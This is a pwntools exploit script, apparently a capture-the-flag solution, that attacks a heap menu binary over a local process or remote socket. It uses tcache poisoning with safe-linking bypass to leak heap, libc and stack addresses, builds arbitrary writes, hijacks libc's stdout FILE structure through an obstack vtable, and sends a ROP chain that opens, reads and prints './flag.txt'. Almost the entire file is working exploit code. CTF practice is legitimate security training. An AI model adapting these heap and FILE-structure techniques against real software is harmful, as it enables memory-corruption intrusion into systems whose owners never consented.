#!/usr/bin/env python3
import sys
from pwn import *


context.binary = exe = ELF('./vuln')
libc = ELF("./libc.so.6")
if args.LOCAL:
    context.terminal = ['tmux','splitw','-h','-p','80']
    io = process([exe.path])
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

def cmd(c):
    io.sendlineafter(b'> ', str(c).encode())

def send(c):
    io.sendafter(b': ', p32(c))

def add(idx, val):
    cmd(1) ; send(idx)
    io.sendafter(b': ', val)

def delete(idx):
    cmd(2) ; send(idx)

def show(idx):
    cmd(4) ; send(idx)

def enc(ptr, addr):
    return ptr ^ (addr >> 12)


for i in range(9):
    add(i, b'aa')
delete(0)
show(0)
heap = unpack(io.recvline()[:-1], 'all') * 0x1000 + 0x2a0
print('[+] heap: ', hex(heap))

for i in range(8, 0, -1):
    delete(i)
delete(2)

for i in range(7):
    add(1, b'aa')

add(2, p64(enc(heap+-0x210, heap+0x40)))
add(2, b'aa')
add(1, b'aa')
add(0, p64(0) + p64(0x00)) # get tcache 0x20 control

add(9, b'aa')
for i in range(9, 1, -1):
    delete(i)
delete(1)
delete(2)

for i in range(7):
    add(3, b'aa')

add(2, p64(enc(heap+-0x220, heap+0x40)))
add(2, b'aa') # chunk with overwritten size
add(1, b'aa')
add(1, p64(0) + p64(0x21))  # set valid size for tcache control chunk

delete(0) ; add(3, p64(0)+p64(0))       # fix 0x20 tcache


add(2, b'aa') ; add(3, b'aa')
delete(2) ; delete(3) ; delete(4) # set tcache size to `3`

add(4, p64(enc(heap+0x90, heap+0x80)))

delete(0) ; add(3, p64(heap+0x80))

add(2, b'aa')
add(2, p64(heap) + p64(0x461)) # fake chunk with invalid size
# 5th chunk size is overwritten

delete(0) ; add(3, p64(0))

for i in range(30):
    add(3, b'aa')

delete(5)
show(5)
libc.address = unpack(io.recvline()[:-1], 'all') - 0x219ce0
link_map = libc.address + 0x276000 + 0x12e0
print('[+] libc: ', hex(libc.address))
print('[+] link_map: ', hex(link_map))

delete(7)
delete(0) ; add(3, p64(libc.sym['environ']-0x10))

add(2, b'a'*0x10)
show(2)
io.recv(0x10)
stack = unpack(io.recvline()[:-1], 'all') - 0x168
print('[+] stack: ', hex(stack))
delete(0) ; add(3, p64(0)) # just fix tcache

def write(what, where):
    add(3, b'aa') ; delete(3)
    delete(0) ; add(3, p64(where))
    add(3, what)
    delete(0) ; add(3, p64(0)) # just fix tcache

# # fake ELF String Table
# add(4, b'puts\0')
# add(4, p64(5) + p64(heap+0xa0-0x30))
# write(p64(0)+p64(heap+0xc0), link_map+0x60)

# # fake ELF GNU Symbol Version Table
# add(4, p64(2))
# add(4, p64(0x6FFFFFF0) + p64(heap+0x100-4*2))
# write(p64(heap+0x120)+p64(0), link_map+0x1d0)

# # rewrite `j_strlen` to just `ret`
# write(p64(0)+p64(libc.address+0x886A8), libc.address+0x219090)

# rewrite `j_strchrnul` to `puts`
write(p64(0)+p64(libc.sym.puts), libc.address+0x2190B0)

# ./flag.txt at libc.address+0x21AAAb
write(p64(0)+b'\0\0\0./fla', libc.address+0x21AAA0)
write(b'g.txt\0\0\0'+p64(0), libc.address+0x21AAb0)

stdout = libc.sym['_IO_2_1_stdout_']
write(p64(0)+p64(libc.address+0x2163C0-0x20), stdout+0xd0)  # vtable
write(p64(stdout-8)+p64(stdout), stdout+0xe0)               # obstack
write(p64(libc.sym.read)+p64(libc.sym.read), stdout+0x30)   # chunkfun, freefun
write(p64(0)+p64(1), stdout+0x40)                           # extra_arg, use_extra_arg

# write(p64(0)+p64(stack-0xb8), stdout-0x10)                  # chunk_size (rsi)
write(p64(0)+p64(stack-0x188), stdout-0x10)                 # chunk_size (rsi)
write(p64(0)+p64(0x1000), stdout+0x20)                      # alignment_mask (rdx)

# write(p64(0)+p64(0x31), stack)
add(3, b'aa') ; delete(3)
delete(0) ; add(3, p64(stack))

if args.LOCAL: gdb.attach(io, 'set $h={heap}\nset $l={libc.address}\nset $m={link_map}\nb *__stack_chk_fail\nb *puts+200\nb *_obstack_newchunk+83\n'.format(**locals()))  # b *add+414\nb *_dl_fixup+252\n

add(3, p64(0)+p64(0x31))

pop_rdi = libc.address + 0x2a3e5
pop_rsi = libc.address + 0x2be51
pop_rdx_rbx = libc.address + 0x90529
mov_rdi_rax_call_rbx_0x360 = libc.address + 0x90108     # : mov rdi, rax ; call qword ptr [rbx + 0x360]
pop_r12 = libc.address + 0x35731
rop = flat([
    pop_rdi, libc.address+0x21AAAb,
    pop_rsi, 0,
    libc.sym.open,
    pop_rsi, stack+0x200,
    pop_rdx_rbx, 0x50, stack-0xf8-0x360,    # pointer to pop r12
    mov_rdi_rax_call_rbx_0x360,
    libc.sym.read,
    pop_rdi, 1,
    libc.sym.write,
    pop_rdi, 0,
    libc.sym['_exit'],
    pop_r12,
])
sleep(0.5)
io.send(rop)

io.recvuntil(b'BAN\n')
print(hexdump(io.recv(0x100)))

io.interactive()
